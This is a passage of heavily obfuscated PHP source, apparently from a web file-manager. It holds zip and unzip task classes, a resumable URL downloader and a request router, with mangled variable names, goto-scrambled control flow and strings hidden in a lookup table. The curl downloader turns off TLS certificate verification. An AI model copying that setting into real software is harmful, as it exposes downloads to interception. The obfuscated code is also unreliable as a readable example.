$Bœ«î„¯¨Ê)); if (is_null($C·é†±ğõŠ)) { unset($Dâö ÔöĞÔ[$cßíù¶÷ğÏ[89]]); } return $this->where($Dâö ÔöĞÔ)->delete(); } public function cacheSet($Eåâ‚Ùù‹Î, $B§†ÄÄÖÅ¶ = false) { return Cache::set($this->cacheKey($Eåâ‚Ùù‹Î), $B§†ÄÄÖÅ¶); } public function cacheGet($fÍ¸Ë”‹¾Ï) { return Cache::get($this->cacheKey($fÍ¸Ë”‹¾Ï)); } public function cacheRemove($aÎøÃË¯¡£) { return Cache::remove($this->cacheKey($aÎøÃË¯¡£)); } protected function filterWhere($AÁ…¶å¾Ÿ“) { return $AÁ…¶å¾Ÿ“; } protected function cacheKey($cŒ™éğŠì‡) { return $cŒ™éğŠì‡; } } goto Cø¼ÁïÍâö; BË½¡¥Ö: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto C²ÔŞ¸Ÿ—; C²ÔŞ¸Ÿ—: $e‚™¸Ìá =& $_SERVER[í…¶]; parent::startAfter(); Hook::bind($e‚™¸Ìá[1503], array($this, $e‚™¸Ìá[1504])); goto EÃ»Š­ÊÉ; EÃ»Š­ÊÉ: Hook::bind($e‚™¸Ìá[1033], array($this, $e‚™¸Ìá[1505])); $fñÎÁæÁä =& $this->task; $fñÎÁæÁä[$e‚™¸Ìá[1506]] = $e‚™¸Ìá[1038]; goto BÂ‹ë’ãù; BÂ‹ë’ãù: if (!$fñÎÁæÁä[$e‚™¸Ìá[1339]]) { $fñÎÁæÁä[$e‚™¸Ìá[1339]] = LNG($e‚™¸Ìá[1507]); } goto CÅŒ‚Íˆ¼; CÅŒ‚Íˆ¼: } protected function endAfter() { $a÷Âõš×Ã¹ =& $_SERVER[í…¶]; parent::endAfter(); Hook::unbind($a÷Âõš×Ã¹[1503], array($this, $a÷Âõš×Ã¹[1504])); Hook::unbind($a÷Âõš×Ã¹[1033], array($this, $a÷Âõš×Ã¹[1505])); } public function updateAfter() { $cÓÂ¹§£ìï =& $_SERVER[í…¶]; $Aœ´®¤¯ª´ =& $this->task; if (!$Aœ´®¤¯ª´[$cÓÂ¹§£ìï[974]] || !$Aœ´®¤¯ª´[$cÓÂ¹§£ìï[700]]) { return; } if ($Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1506]] == $cÓÂ¹§£ìï[1038]) { $e½ºÃ»Ş¢ø = 0; if ($Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1478]]) { $e½ºÃ»Ş¢ø = $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1479]] / $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1478]]; } $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1434]] = $e½ºÃ»Ş¢ø * 0.3; } else { if ($Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1506]] == $cÓÂ¹§£ìï[301]) { $e½ºÃ»Ş¢ø = $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[988]] / $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[974]]; $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1434]] = 0.3 + $e½ºÃ»Ş¢ø * 0.4; } else { if ($Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1506]] == $cÓÂ¹§£ìï[103]) { $dßÖîöàÓ = 0; if ($Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1480]] == $cÓÂ¹§£ìï[103]) { $dßÖîöàÓ = $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1479]]; } $e½ºÃ»Ş¢ø = ($Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1483]] + $dßÖîöàÓ) / $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[700]]; $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1434]] = 0.3 + 0.4 + $e½ºÃ»Ş¢ø * 0.3; } } } if ($Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1434]] > 0) { $F¡“Õ¬õÏÌ = timeFloat() - $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1436]] - $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1439]]; $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1440]] = $F¡“Õ¬õÏÌ * (1 - $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1434]]) / $Aœ´®¤¯ª´[$cÓÂ¹§£ìï[1434]]; } } public function addFile($Fäší»‚Û) { goto F“íê¶ˆƒ·; c¯¶Å¬®„Ú: $this->update(); goto E§è‹Ş– ; aòĞõˆ¤ºŞ: $DÌ´¸öëŠğ[$c’•‰Óï[974]] = 1; $BÑêÏÊª°· = 0; $DÌ´¸öëŠğ[$c’•‰Óï[1487]] = array($c’•‰Óï[1488] => $BÑêÏÊª°· + 1, $c’•‰Óï[395] => $cˆÊŒÔŠ‚ò[$c’•‰Óï[28]], $c’•‰Óï[75] => $cˆÊŒÔŠ‚ò[$c’•‰Óï[75]], $c’•‰Óï[475] => $cˆÊŒÔŠ‚ò[$c’•‰Óï[475]] ? $cˆÊŒÔŠ‚ò[$c’•‰Óï[475]] : $cˆÊŒÔŠ‚ò[$c’•‰Óï[75]]); goto c¯¶Å¬®„Ú; C’«õë›¤¾: $DÌ´¸öëŠğ[$c’•‰Óï[1476]] = $cˆÊŒÔŠ‚ò[$c’•‰Óï[28]]; $DÌ´¸öëŠğ[$c’•‰Óï[1478]] = $cˆÊŒÔŠ‚ò[$c’•‰Óï[77]]; $DÌ´¸öëŠğ[$c’•‰Óï[1479]] = 0; goto b‹œÚ‚ë¥; b‹œÚ‚ë¥: $DÌ´¸öëŠğ[$c’•‰Óï[976]] = $c’•‰Óï[1495]; $DÌ´¸öëŠğ[$c’•‰Óï[1480]] = $c’•‰Óï[1038]; $DÌ´¸öëŠğ[$c’•‰Óï[700]] = $cˆÊŒÔŠ‚ò[$c’•‰Óï[77]]; goto aòĞõˆ¤ºŞ; F“íê¶ˆƒ·: $c’•‰Óï =& $_SERVER[í…¶]; $DÌ´¸öëŠğ =& $this->task; $cˆÊŒÔŠ‚ò = IO::info($Fäší»‚Û); goto C’«õë›¤¾; E§è‹Ş– : } public function unzipAfter($cÙ®Ò™â†›) { goto cÕİ¢®…Ø; A–ƒ¶†œ: $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[1476]] = $dÑ®‰ÉÖæ†[33]; $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[1483]] = 0; $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[700]] = $fÕŞ”…ˆ·Í[$dÑ®‰ÉÖæ†[77]]; goto d‘º¶ÜÃ‚; BË“¬¤š‡: $fÕŞ”…ˆ·Í = IO::infoWithChildren($cÙ®Ò™â†›); $F–èË‰¤¯Ï = 0; $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[1487]] = array($dÑ®‰ÉÖæ†[1488] => $F–èË‰¤¯Ï + 1, $dÑ®‰ÉÖæ†[395] => $fÕŞ”…ˆ·Í[$dÑ®‰ÉÖæ†[28]], $dÑ®‰ÉÖæ†[75] => $fÕŞ”…ˆ·Í[$dÑ®‰ÉÖæ†[75]], $dÑ®‰ÉÖæ†[475] => $fÕŞ”…ˆ·Í[$dÑ®‰ÉÖæ†[475]] ? $fÕŞ”…ˆ·Í[$dÑ®‰ÉÖæ†[475]] : $fÕŞ”…ˆ·Í[$dÑ®‰ÉÖæ†[75]]); goto D’†°×º”Õ; D’†°×º”Õ: if ($fÕŞ”…ˆ·Í[$dÑ®‰ÉÖæ†[29]] == $dÑ®‰ÉÖæ†[167]) { $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[974]] = 1; } else { $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[974]] = $fÕŞ”…ˆ·Í[$dÑ®‰ÉÖæ†[80]][$dÑ®‰ÉÖæ†[78]]; } $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[976]] = $dÑ®‰ÉÖæ†[33]; $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[1480]] = 0; goto c™­ËâçŠ; cÕİ¢®…Ø: $dÑ®‰ÉÖæ† =& $_SERVER[í…¶]; $a‰Üù®È‚ö =& $this->task; $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[1506]] = $dÑ®‰ÉÖæ†[103]; goto BË“¬¤š‡; d‘º¶ÜÃ‚: $this->update(); self::log($dÑ®‰ÉÖæ†[1508] . json_encode(array($a‰Üù®È‚ö, $fÕŞ”…ˆ·Í))); goto A¬À¼„ª¨§; c™­ËâçŠ: $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[988]] = 0; $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[1478]] = 0; $a‰Üù®È‚ö[$dÑ®‰ÉÖæ†[1479]] = 0; goto A–ƒ¶†œ; A¬À¼„ª¨§: } public function nameParse($e´ƒ‰­ ¦ƒ) { goto AŞ‰‘Äà´›; eÃŒ÷š‚ÅÈ: $this->update(); goto a×…â‰¾œè; AŞ‰‘Äà´›: $DøŒ’²îÁç =& $_SERVER[í…¶]; $AÃøÃñ•˜ =& $this->task; if ($AÃøÃñ•˜[$DøŒ’²îÁç[1506]] == $DøŒ’²îÁç[1038]) { $AÃøÃñ•˜[$DøŒ’²îÁç[1506]] = $DøŒ’²îÁç[301]; $AÃøÃñ•˜[$DøŒ’²îÁç[1483]] = 0; $AÃøÃñ•˜[$DøŒ’²îÁç[700]] = 0; } goto F¸ªœ¡´Ê; F¸ªœ¡´Ê: $fÍé¤Ï‘ç = get_path_this($e´ƒ‰­ ¦ƒ); if (strstr($fÍé¤Ï‘ç, $DøŒ’²îÁç[91])) { $AÃøÃñ•˜[$DøŒ’²îÁç[988]] += 1; $AÃøÃñ•˜[$DøŒ’²îÁç[974]] += 1; } $AÃøÃñ•˜[$DøŒ’²îÁç[1476]] = $e´ƒ‰­ ¦ƒ; goto eÃŒ÷š‚ÅÈ; a×…â‰¾œè: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $C¢ŠˆÀ–îô =& $_SERVER[í…¶]; parent::startAfter(); Hook::bind($C¢ŠˆÀ–îô[1509], array($this, $C¢ŠˆÀ–îô[1504])); $Eµô²†Òì =& $this->task; $Eµô²†Òì[$C¢ŠˆÀ–îô[1506]] = $C¢ŠˆÀ–îô[1038]; if (!$Eµô²†Òì[$C¢ŠˆÀ–îô[1339]]) { $Eµô²†Òì[$C¢ŠˆÀ–îô[1339]] = LNG($C¢ŠˆÀ–îô[1510]); } } protected function endAfter() { $bñë‡‚ =& $_SERVER[í…¶]; parent::endAfter(); Hook::unbind($bñë‡‚[1509], array($this, $bñë‡‚[1504])); } public function updateAfter() { $Eá¬š‰„° =& $_SERVER[í…¶]; $bƒùöõÒÍò =& $this->task; if (!$bƒùöõÒÍò[$Eá¬š‰„°[974]] || !$bƒùöõÒÍò[$Eá¬š‰„°[700]]) { return; } if ($bƒùöõÒÍò[$Eá¬š‰„°[1506]] == $Eá¬š‰„°[1038]) { $föœ¬êÂ…ˆ = $bƒùöõÒÍò[$Eá¬š‰„°[1479]]; if ($bƒùöõÒÍò[$Eá¬š‰„°[1480]] != $Eá¬š‰„°[1038]) { $föœ¬êÂ…ˆ = 0; } $Aó›…ÕÆ­œ = ($bƒùöõÒÍò[$Eá¬š‰„°[1483]] + $föœ¬êÂ…ˆ) / $bƒùöõÒÍò[$Eá¬š‰„°[700]]; $bƒùöõÒÍò[$Eá¬š‰„°[1434]] = $Aó›…ÕÆ­œ * 0.3; } else { if ($bƒùöõÒÍò[$Eá¬š‰„°[1506]] == $Eá¬š‰„°[301]) { $Aó›…ÕÆ­œ = $bƒùöõÒÍò[$Eá¬š‰„°[988]] / $bƒùöõÒÍò[$Eá¬š‰„°[974]]; $bƒùöõÒÍò[$Eá¬š‰„°[1434]] = 0.3 + $Aó›…ÕÆ­œ * 0.5; } else { if ($bƒùöõÒÍò[$Eá¬š‰„°[1506]] == $Eá¬š‰„°[103]) { $Aó›…ÕÆ­œ = 0; if ($bƒùöõÒÍò[$Eá¬š‰„°[1478]]) { $Aó›…ÕÆ­œ = $bƒùöõÒÍò[$Eá¬š‰„°[1479]] / $bƒùöõÒÍò[$Eá¬š‰„°[1478]]; } $bƒùöõÒÍò[$Eá¬š‰„°[1434]] = 0.3 + 0.5 + $Aó›…ÕÆ­œ * 0.2; } } } if ($bƒùöõÒÍò[$Eá¬š‰„°[1434]] > 0) { $A×åïÎ = timeFloat() - $bƒùöõÒÍò[$Eá¬š‰„°[1436]] - $bƒùöõÒÍò[$Eá¬š‰„°[1439]]; $bƒùöõÒÍò[$Eá¬š‰„°[1440]] = $A×åïÎ * (1 - $bƒùöõÒÍò[$Eá¬š‰„°[1434]]) / $bƒùöõÒÍò[$Eá¬š‰„°[1434]]; } } public function copyFileStart($EÆ–‡Ì·, $e†Ü¤òÆÍ¬, $D°’ùœ Í, $e·÷½Éİ», $CÍÕŠÈàÀÖ, $B†Şœ¸¸À) { $f¡¬öÔô¥œ =& $_SERVER[í…¶]; parent::copyFileStart($EÆ–‡Ì·, $e†Ü¤òÆÍ¬, $D°’ùœ Í, $e·÷½Éİ», $CÍÕŠÈàÀÖ, $B†Şœ¸¸À); $D ·æÉ‘”Ä =& $this->task; if ($D ·æÉ‘”Ä[$f¡¬öÔô¥œ[1506]] == $f¡¬öÔô¥œ[301]) { $D ·æÉ‘”Ä[$f¡¬öÔô¥œ[1506]] = $f¡¬öÔô¥œ[103]; } $this->update(); } public function copyFileEnd($D³¹­Î£Š, $f´Øâ‡¯Û, $dæâ–æªÛ¹, $C‹ìæ‚èØå, $aì¼¸—’íò, $eˆÕƒ‘áƒò) { $bê’Ò‘¯ =& $_SERVER[í…¶]; $b»í·ñàç£ =& $this->task; $b»í·ñàç£[$bê’Ò‘¯[1479]] = $b»í·ñàç£[$bê’Ò‘¯[1478]]; $b»í·ñàç£[$bê’Ò‘¯[1483]] += $b»í·ñàç£[$bê’Ò‘¯[1478]]; $b»í·ñàç£[$bê’Ò‘¯[1480]] = $bê’Ò‘¯[33]; $this->update(); } public function nameParse($B¡Í¨Œï¸) { $BµàÈÜ‰Ë =& $_SERVER[í…¶]; $aôÓîÕË°ï =& $this->task; if ($aôÓîÕË°ï[$BµàÈÜ‰Ë[988]] < $aôÓîÕË°ï[$BµàÈÜ‰Ë[974]]) { $C³ÀÎö”±Ö = get_path_this($B¡Í¨Œï¸); if (strstr($C³ÀÎö”±Ö, $BµàÈÜ‰Ë[91])) { $aôÓîÕË°ï[$BµàÈÜ‰Ë[988]] += 1; } } if ($aôÓîÕË°ï[$BµàÈÜ‰Ë[1506]] == $BµàÈÜ‰Ë[1038]) { $aôÓîÕË°ï[$BµàÈÜ‰Ë[1506]] = $BµàÈÜ‰Ë[301]; } $aôÓîÕË°ï[$BµàÈÜ‰Ë[1476]] = $B¡Í¨Œï¸; $this->update(); } } class Downloader { static function start($e­á÷ÆšÀ´, $Bˆ‰ƒµêŠÖ, $bõí”öùƒ¬ = 10) { goto e“¯¥ƒŸ¨ø; EÎ°Ô×òâ•: if ($BÆ®äÃ›Œ > $B’”Â‘ì§¡) { @unlink($E›ø°º…¿£); } file_put_contents($Cî¯‘Òâ¡Õ, json_encode($aØó¢¥÷ƒŞ)); $A¤Ïø…‰‡Ì = self::fileDownloadCurl($e­á÷ÆšÀ´, $Bˆ‰ƒµêŠÖ, !0, $BÆ®äÃ›Œ, $B’”Â‘ì§¡); goto d™‡É¢¡×; aºñ‡œ‹¥É: if (!$e­á÷ÆšÀ´) { return array($bí±È¾“«Ó[1030] => !1, $bí±È¾“«Ó[1032] => $bí±È¾“«Ó[1035]); } if (!$dÑ«”„á—[$bí±È¾“«Ó[1286]] || $dÑ«”„á—[$bí±È¾“«Ó[325]] == 0) { @unlink($E›ø°º…¿£); @unlink($Bˆ‰ƒµêŠÖ); $A¤Ïø…‰‡Ì = self::fileDownloadFopen($e­á÷ÆšÀ´, $Bˆ‰ƒµêŠÖ, $dÑ«”„á—[$bí±È¾“«Ó[325]]); if ($A¤Ïø…‰‡Ì[$bí±È¾“«Ó[1030]]) { return $A¤Ïø…‰‡Ì; } else { @unlink($E›ø°º…¿£); @unlink($Bˆ‰ƒµêŠÖ); $A¤Ïø…‰‡Ì = self::fileDownloadCurl($e­á÷ÆšÀ´, $Bˆ‰ƒµêŠÖ, !1, 0, $dÑ«”„á—[$bí±È¾“«Ó[325]]); @unlink($E›ø°º…¿£); return $A¤Ïø…‰‡Ì; } } $BÆ®äÃ›Œ = is_file($E›ø°º…¿£) ? filesize($E›ø°º…¿£) : 0; goto A¦©ÁÑ”à; Fµµ‘º‰: if (is_file($Cî¯‘Òâ¡Õ)) { $f‹î´È ï… = file_get_contents($Cî¯‘Òâ¡Õ); $aØó¢¥÷ƒŞ = json_decode($f‹î´È ï…, 1); } if (file_exists($Bˆ‰ƒµêŠÖ) && $B’”Â‘ì§¡ == filesize($Bˆ‰ƒµêŠÖ)) { @unlink($E›ø°º…¿£); @unlink($Cî¯‘Òâ¡Õ); return array($bí±È¾“«Ó[1030] => !0, $bí±È¾“«Ó[1032] => $bí±È¾“«Ó[1514]); } if ($aØó¢¥÷ƒŞ[$bí±È¾“«Ó[325]] != $B’”Â‘ì§¡) { $aØó¢¥÷ƒŞ = array($bí±È¾“«Ó[325] => $B’”Â‘ì§¡); } goto EÎ°Ô×òâ•; A¦©ÁÑ”à: $B’”Â‘ì§¡ = intval($dÑ«”„á—[$bí±È¾“«Ó[325]]); if (file_exists($E›ø°º…¿£) && time() - filemtime($E›ø°º…¿£) < 3) { return array($bí±È¾“«Ó[1030] => !1, $bí±È¾“«Ó[1032] => $bí±È¾“«Ó[1513]); } $aØó¢¥÷ƒŞ = array(); goto Fµµ‘º‰; e“¯¥ƒŸ¨ø: $bí±È¾“«Ó =& $_SERVER[í…¶]; if (!request_url_safe($e­á÷ÆšÀ´)) { return array($bí±È¾“«Ó[1030] => !1, $bí±È¾“«Ó[1032] => $bí±È¾“«Ó[1035]); } $Cî¯‘Òâ¡Õ = $Bˆ‰ƒµêŠÖ . $bí±È¾“«Ó[1511]; goto EØ×ø»ƒ†‹; EØ×ø»ƒ†‹: $E›ø°º…¿£ = $Bˆ‰ƒµêŠÖ . $bí±È¾“«Ó[1512]; if (is_array($e­á÷ÆšÀ´)) { $dÑ«”„á— = $e­á÷ÆšÀ´; } else { $dÑ«”„á— = url_header($e­á÷ÆšÀ´); } $e­á÷ÆšÀ´ = $dÑ«”„á—[$bí±È¾“«Ó[295]]; goto aºñ‡œ‹¥É; d™‡É¢¡×: if ($A¤Ïø…‰‡Ì[$bí±È¾“«Ó[1030]]) { @unlink($Cî¯‘Òâ¡Õ); } return $A¤Ïø…‰‡Ì; goto DºóÙÔ™½¦; DºóÙÔ™½¦: } static function fileDownloadFopen($Aö‚Ö¿õ‚ó, $c»—ßâÉÑ, $C÷‰”å«Ü = 0) { $CƒÊ‹œÕêø =& $_SERVER[í…¶]; @ini_set($CƒÊ‹œÕêø[1515], $CƒÊ‹œÕêø[1516]); $cÂ”é©Ëêƒ = $c»—ßâÉÑ . $CƒÊ‹œÕêø[1512]; set_timeout(); @unlink($cÂ”é©Ëêƒ); if ($dÈ‹ïŒ›Ùß = @fopen($Aö‚Ö¿õ‚ó, $CƒÊ‹œÕêø[1517])) { goto DÉ¯ÆØÔŠœ; DÉ¯ÆØÔŠœ: if (!($dåŠ˜æö…³ = @fopen($cÂ”é©Ëêƒ, $CƒÊ‹œÕêø[1518]))) { return array($CƒÊ‹œÕêø[1030] => !1, $CƒÊ‹œÕêø[1032] => $CƒÊ‹œÕêø[1519]); } while (!feof($dÈ‹ïŒ›Ùß)) { if (!file_exists($cÂ”é©Ëêƒ)) { fclose($dåŠ˜æö…³); return array($CƒÊ‹œÕêø[1030] => !1, $CƒÊ‹œÕêø[1032] => $CƒÊ‹œÕêø[1520]); } clearstatcache(); if ($C÷‰”å«Ü > 0 && $C÷‰”å«Ü == filesize(iconv_system($cÂ”é©Ëêƒ))) { break; } fwrite($dåŠ˜æö…³, fread($dÈ‹ïŒ›Ùß, 1024 * 8), 1024 * 8); } fclose($dåŠ˜æö…³); goto fÃ—Â‹ğ; fÃ—Â‹ğ: fclose($dÈ‹ïŒ›Ùß); self::checkGzip($cÂ”é©Ëêƒ); if (!@rename($cÂ”é©Ëêƒ, $c»—ßâÉÑ)) { usleep(round(rand(0, 1000) * 50)); @unlink($c»—ßâÉÑ); $E…Ü’’‰ÒÒ = @rename($cÂ”é©Ëêƒ, $c»—ßâÉÑ); if (!$E…Ü’’‰ÒÒ) { return array($CƒÊ‹œÕêø[1030] => !1, $CƒÊ‹œÕêø[1032] => $CƒÊ‹œÕêø[1521]); } } goto aˆ‚ŠïŒÛ; aˆ‚ŠïŒÛ: return array($CƒÊ‹œÕêø[1030] => !0, $CƒÊ‹œÕêø[1032] => $CƒÊ‹œÕêø[698]); goto e…ÙñÜô¢; e…ÙñÜô¢: } else { return array($CƒÊ‹œÕêø[1030] => !1, $CƒÊ‹œÕêø[1032] => $CƒÊ‹œÕêø[1522]); } } static function fileDownloadCurl($fàÊÏƒÅ¿, $DÊÅœÖÁª‡, $CòÒãñ¡¯Ù = false, $b¶˜ ŸøÄ = 0, $fÔª¸­”¥Û = 0) { goto b‘Ú˜»áİ; E¶¿‹…¢êŠ: $A±¹ÔÕœ¡Â = @fopen($Eƒí“‘ğ•Â, $dˆ®°îŠÁó[978]); if (!$A±¹ÔÕœ¡Â) { return array($dˆ®°îŠÁó[1030] => !1, $dˆ®°îŠÁó[1032] => $dˆ®°îŠÁó[1523]); } $fÍ®©†Š†ã = curl_init($fàÊÏƒÅ¿); goto BÆ­Ú…ì¾; cç¶§££¤Ä: curl_setopt($fÍ®©†Š†ã, CURLOPT_NOPROGRESS, !1); curl_setopt($fÍ®©†Š†ã, CURLOPT_PROGRESSFUNCTION, $dˆ®°îŠÁó[1524]); curl_progress_start($fÍ®©†Š†ã); goto E¾Áœ¹´å¾; E¾Áœ¹´å¾: curl_setopt($fÍ®©†Š†ã, CURLOPT_USERAGENT, $dˆ®°îŠÁó[1516]); $E¯ôí—øÄò = curl_exec($fÍ®©†Š†ã); curl_progress_end($fÍ®©†Š†ã); goto dÖ» ÏÉ¶; dÖ» ÏÉ¶: curl_close($fÍ®©†Š†ã); fclose($A±¹ÔÕœ¡Â); $Aì‘Ê¾’íÁ = filesize(iconv_system($Eƒí“‘ğ•Â)); goto dĞÊÃä¿·÷; BÆ­Ú…ì¾: if ($CòÒãñ¡¯Ù) { curl_setopt($fÍ®©†Š†ã, CURLOPT_RANGE, $b¶˜ ŸøÄ . $dˆ®°îŠÁó[718]); } curl_setopt($fÍ®©†Š†ã, CURLOPT_FILE, $A±¹ÔÕœ¡Â); curl_setopt($fÍ®©†Š†ã, CURLOPT_REFERER, get_url_link($fàÊÏƒÅ¿)); goto d¬·Õ™–ñ; b‘Ú˜»áİ: $dˆ®°îŠÁó =& $_SERVER[í…¶]; $Eƒí“‘ğ•Â = $DÊÅœÖÁª‡ . $dˆ®°îŠÁó[1512]; set_timeout(); goto E¶¿‹…¢êŠ; d¬·Õ™–ñ: curl_setopt($fÍ®©†Š†ã, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($fÍ®©†Š†ã, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($fÍ®©†Š†ã, CURLOPT_SSL_VERIFYHOST, 0); goto cç¶§££¤Ä; dĞÊÃä¿·÷: if ($Aì‘Ê¾’íÁ < $fÔª¸­”¥Û && $fÔª¸­”¥Û != 0) { return array($dˆ®°îŠÁó[1030] => !1, $dˆ®°îŠÁó[1032] => $dˆ®°îŠÁó[1513]); } if ($E¯ôí—øÄò && filesize($Eƒí“‘ğ•Â) != 0) { self::checkGzip($Eƒí“‘ğ•Â); if (!@rename($Eƒí“‘ğ•Â, $DÊÅœÖÁª‡)) { @unlink($DÊÅœÖÁª‡); $E¯ôí—øÄò = @rename($Eƒí“‘ğ•Â, $DÊÅœÖÁª‡); if (!$E¯ôí—øÄò) { return array($dˆ®°îŠÁó[1030] => !1, $dˆ®°îŠÁó[1032] => $dˆ®°îŠÁó[1525]); } } return array($dˆ®°îŠÁó[1030] => !0, $dˆ®°îŠÁó[1032] => $dˆ®°îŠÁó[698]); } return array($dˆ®°îŠÁó[1030] => !1, $dˆ®°îŠÁó[1032] => $dˆ®°îŠÁó[1526]); goto A¨¨Ñ¼ÙØš; A¨¨Ñ¼ÙØš: } static function checkGzip($Aš›áíŒ÷÷) { goto FÔÚì¬³°Û; A’ó»…À±¼: file_put_contents($Aš›áíŒ÷÷, $Dƒ‹¹—†¢í); goto DƒÖÏ›èµË; FËĞôù¥­¢: ob_start(); readgzfile($Aš›áíŒ÷÷); $Dƒ‹¹—†¢í = ob_get_clean(); goto A’ó»…À±¼; FÔÚì¬³°Û: $d°Šê„ªÖŸ = $_SERVER[í…¶][1527]; $dô‚»Ì‹êŠ = file_sub_str($Aš›áíŒ÷÷, 0, 2); if ($d°Šê„ªÖŸ != $dô‚»Ì‹êŠ) { return; } goto FËĞôù¥­¢; DƒÖÏ›èµË: } } goto b°°‰˜‰¼Ë; dˆŸÚâ‡­¶: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\x5b\136\x2f\x5d\x2b", "\72\156\x75\x6d" => "\x5b\x30\55\71\135\53", "\72\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($a«œ¡ìö«Ö, $B½Èâå¡ùÔ) { $a‹ÄÄÙ°‹İ =& $_SERVER[í…¶]; if ($a«œ¡ìö«Ö == $a‹ÄÄÙ°‹İ[1382]) { $fíé˜ÆÅƒ = array_map($a‹ÄÄÙ°‹İ[1383], $B½Èâå¡ùÔ[0]); $C’šÓ¡æ÷˜ = strpos($B½Èâå¡ùÔ[1], $a‹ÄÄÙ°‹İ[8]) === 0 ? $B½Èâå¡ùÔ[1] : $a‹ÄÄÙ°‹İ[8] . $B½Èâå¡ùÔ[1]; $a®š¡îÉƒø = $B½Èâå¡ùÔ[2]; } else { $fíé˜ÆÅƒ = null; $C’šÓ¡æ÷˜ = strpos($B½Èâå¡ùÔ[0], $a‹ÄÄÙ°‹İ[8]) === 0 ? $B½Èâå¡ùÔ[0] : $a‹ÄÄÙ°‹İ[8] . $B½Èâå¡ùÔ[0]; $a®š¡îÉƒø = $B½Èâå¡ùÔ[1]; } array_push(self::$maps, $fíé˜ÆÅƒ); array_push(self::$routes, $C’šÓ¡æ÷˜); array_push(self::$methods, strtoupper($a«œ¡ìö«Ö)); array_push(self::$callbacks, $a®š¡îÉƒø); } public static function error($a¥ÉÜÖî˜Ñ) { self::$errorCallback = $a¥ÉÜÖî˜Ñ; } public static function haltOnMatch($BŠÜÜç¾Ã = true) { self::$halts = $BŠÜÜç¾Ã; } public static function dispatch() { goto dĞ”ƒ´Ÿáˆ; dĞ”ƒ´Ÿáˆ: $Eˆß÷‹¡ŒÙ =& $_SERVER[í…¶]; $B‹Ëº‰ ª = parse_url($_SERVER[$Eˆß÷‹¡ŒÙ[1384]], PHP_URL_PATH); $dŒ‡ˆÇíˆ½ = $_SERVER[$Eˆß÷‹¡ŒÙ[154]]; goto eÄÕ’¨õ‰¶; C¼‚É”Ÿó½: self::$routes = preg_replace($Eˆß÷‹¡ŒÙ[1071], $Eˆß÷‹¡ŒÙ[8], self::$routes); if (in_array($B‹Ëº‰ ª, self::$routes)) { $e‘¡”·Š = array_keys(self::$routes, $B‹Ëº‰ ª); foreach ($e‘¡”·Š as $EÒ÷‘¶‰œ) { if (self::$methods[$EÒ÷‘¶‰œ] == $dŒ‡ˆÇíˆ½ || self::$methods[$EÒ÷‘¶‰œ] == $Eˆß÷‹¡ŒÙ[1385] || in_array($dŒ‡ˆÇíˆ½, self::$maps[$EÒ÷‘¶‰œ])) { $Dˆ§±Ö¬ñ½ = !0; if (!is_object(self::$callbacks[$EÒ÷‘¶‰œ])) { $BÑ¢ÂÑ˜“ç = explode($Eˆß÷‹¡ŒÙ[8], self::$callbacks[$EÒ÷‘¶‰œ]); $Cİåª‘ç = end($BÑ¢ÂÑ˜“ç); $e¾İ­Àì¡¬ = explode($Eˆß÷‹¡ŒÙ[1386], $Cİåª‘ç); $EÆ¤Áâ¬‡ = new $e¾İ­Àì¡¬[0](); $EÆ¤Áâ¬‡->{$e¾İ­Àì¡¬[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$EÒ÷‘¶‰œ]); if (self::$halts) { return; } } } } } else { $Få–Û÷Ô’œ = 0; foreach (self::$routes as $EÒ÷‘¶‰œ) { if (strpos($EÒ÷‘¶‰œ, $Eˆß÷‹¡ŒÙ[4]) !== !1) { $EÒ÷‘¶‰œ = str_replace($dèˆ§Š±‡¿, $Eá´¥°¥¤, $EÒ÷‘¶‰œ); } if (preg_match($Eˆß÷‹¡ŒÙ[1387] . $EÒ÷‘¶‰œ . $Eˆß÷‹¡ŒÙ[1388], $B‹Ëº‰ ª, $C‹Å…»„ãğ)) { if (self::$methods[$Få–Û÷Ô’œ] == $dŒ‡ˆÇíˆ½ || self::$methods[$Få–Û÷Ô’œ] == $Eˆß÷‹¡ŒÙ[1385] || !empty(self::$maps[$Få–Û÷Ô’œ]) && in_array($dŒ‡ˆÇíˆ½, self::$maps[$Få–Û÷Ô’œ])) { $Dˆ§±Ö¬ñ½ = !0; array_shift($C‹Å…»„ãğ); if (!is_object(self::$callbacks[$Få–Û÷Ô’œ])) { $BÑ¢ÂÑ˜“ç = explode($Eˆß÷‹¡ŒÙ[8], self::$callbacks[$Få–Û÷Ô’œ]); $Cİåª‘ç = 